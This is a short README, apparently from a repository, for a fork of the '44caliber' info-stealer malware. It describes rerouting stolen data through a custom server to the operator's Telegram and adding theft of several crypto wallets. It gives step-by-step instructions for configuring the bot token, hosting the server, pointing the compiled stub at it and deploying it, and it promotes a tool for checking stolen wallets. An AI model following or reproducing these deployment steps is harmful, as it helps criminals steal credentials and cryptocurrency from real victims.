# 44CALIBER-SERVER
44caliber stealer by khainaaeh but with server and some more crypto wallets

changes:
- sending to discord replaced with sending to custom server (/server) and then server sends log to your telegram (server based on my previous project https://lolz.guru/threads/2361390/)
- added some more crypto wallets (metamask, roninwallet, bravewallet, binancechain)

how to use:

1. open server/main.py
2. replace token with your telegram bot token and user id with your telegram user id
3. install python 3.9, flask etc to your dedicated
4. move server to your server and run it
5. open stub/44CALIBER/Resources/sendbyhttp/http.cs, replace localhost in http://localhost:5264 with your server ip
6. close it
7. compile it
8. use it

btw checking new wallets is way better and easier with my crypto checker https://lolz.guru/threads/2915136/ :)

thanks: khainaaeh for original 44caliber (https://github.com/Khainaaeh/44CALIBER)
